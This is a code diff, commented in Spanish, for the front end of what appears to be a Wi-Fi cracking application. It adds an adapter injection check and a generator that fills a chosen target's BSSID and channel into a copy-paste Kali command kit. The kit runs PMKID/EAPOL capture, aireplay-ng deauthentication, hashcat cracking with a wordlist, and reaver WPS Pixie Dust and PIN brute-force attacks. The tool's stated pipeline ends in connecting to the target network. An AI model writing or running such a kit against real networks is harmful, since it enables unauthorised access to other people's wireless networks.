@@ -335,6 +335,8 @@ window.showTab = function (id) {
       }
     } else if (id === 'attack') {
       _flushLive();
+      // Veredicto de hardware informativo (sin gating: nada se bloquea).
+      if (window.applyHardwareGates) window.applyHardwareGates();
     }
     _flushLog();
   } catch (e) {
@@ -1903,4 +1905,83 @@ window.doWslKill = async function () {
   for (const p of ['hcxdumptool', 'airodump-ng', 'wash', 'aireplay-ng', 'reaver']) {
     await window.wslShow('kill', window.__invoke('wsl_kill', { pattern: p }));
   }
+};
+
+// ── Veredicto de hardware (RT3070: informativo, sin bloqueos) ─────────────
+// Al abrir el tab Ataque mide (check_injection_capability) si el adaptador
+// inyecta y lo muestra en #hw-cap-line. NADA se bloquea: los botones siguen
+// lanzables y el pipeline pasivo sigue siendo el camino principal.
+window.applyHardwareGates = async function () {
+  if (window._hwGatesDone) return;
+  window._hwGatesDone = true;
+  const line = $('hw-cap-line');
+  let chip = '?', guid = null, supported = false, msg = '';
+  try {
+    const rep = await window.__invoke('detect_adapters');
+    const ads = rep?.adapters || [];
+    const cap = ads.find(a => a.monitor_capable) || ads[0];
+    if (cap) { chip = cap.chipset || cap.name || '?'; guid = cap.guid || null; }
+  } catch (e) { msg = 'detect_adapters falló: ' + e; }
+  try {
+    const inj = await window.__invoke('check_injection_capability', { ifaceGuid: guid || '' });
+    supported = !!inj?.supported;
+    msg = msg || inj?.message || '';
+  } catch (e) { msg = msg || ('check_injection_capability falló: ' + e); }
+  if (line) {
+    line.classList.remove('ok', 'no');
+    if (supported) {
+      line.classList.add('ok');
+      line.innerHTML = '<b>Hardware:</b> ' + esc(chip) + ' — <b style="color:var(--green)">TX disponible</b>: ataques activos listos.' + (msg ? ' <span style="color:var(--muted)">' + esc(msg) + '</span>' : '');
+    } else {
+      line.classList.add('no');
+      line.innerHTML = '<b>Hardware:</b> ' + esc(chip) + ' — <b style="color:var(--orange)">captura pasiva</b> (sin TX/cambio de canal, límite driver/Npcap medido). ' +
+        'Pipeline pasivo: captura &#8594; convertir &#8594; crack &#8594; keygen &#8594; conectar. RF activa: «Kit Kali» o Kali live USB.';
+    }
+  }
+  log('Hardware: ' + chip + (supported ? ' con TX.' : ' en modo pasivo (sin TX).'), supported ? 'ok' : 'info');
+};
+
+// ── Kit Kali para el objetivo seleccionado ────────────────────────────────
+// La RT3070 en Windows solo escucha; con Kali live USB (rt2800usb) la MISMA
+// antena inyecta y cambia de canal. Este botón genera el bloque de comandos
+// listos (hcxdumptool, aireplay, reaver, hashcat) para el objetivo elegido,
+// sustituyendo BSSID/canal automáticamente.
+window.genKaliKit = function () {
+  const bssid = getSelectedBssid();
+  if (!bssid) return;
+  const ssid = targetSsid() || 'TU_RED';
+  const ch = selectedChannel() || 11;
+  const out = $('kali-kit-out');
+  const mac = bssid.replace(/:/g, '-');
+  const kit = [
+    '# ═══ KIT KALI LIVE USB — objetivo: ' + ssid + ' (' + bssid + ', canal ' + ch + ') ═══',
+    '# 1) Arranca Kali live USB con la RT3070 enchufada (rt2800usb la toma nativa).',
+    '# 2) Copia/pega estos comandos en la terminal de Kali:',
+    '',
+    '# Modo monitor + canal del objetivo',
+    'sudo ip link set wlan0 down && sudo iw dev wlan0 set type monitor && sudo ip link set wlan0 up',
+    'sudo iw dev wlan0 set channel ' + ch,
+    '',
+    '# Captura PMKID/EAPOL (30-60s; con --rds=1 salta canales si prefieres)',
+    'sudo timeout 60 hcxdumptool -i wlan0 --enable_status=3 -o captura_' + mac + '.pcapng',
+    '',
+    '# (Opcional) forzar handshake: deauth SOLO a TU AP',
+    'sudo aireplay-ng -0 5 -a ' + bssid + ' wlan0',
+    '',
+    '# Convertir y crackear (en Kali o de vuelta en Windows con la app)',
+    'hcxpcapngtool -o hash.22000 captura_' + mac + '.pcapng',
+    'hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt',
+    '',
+    '# WPS (si el AP lo tiene: wash -i wlan0)',
+    'sudo reaver -i wlan0 -b ' + bssid + ' -vv -K 1   # Pixie Dust',
+    'sudo reaver -i wlan0 -b ' + bssid + ' -vv        # PIN bruteforce',
+    '',
+    '# El .pcapng lo puedes traer de vuelta a Windows y rematar aquí:',
+    '#   tab Ataque → paso C (Convertir) → paso D (Crack hashcat).',
+  ].join('\n');
+  if (out) {
+    out.textContent = kit;
+    out.style.display = 'block';
+  }
+  log('Kit Kali generado para ' + ssid + ' (' + bssid + ', CH' + ch + '). Copia los comandos a la terminal de Kali live USB.', 'ok');
 };
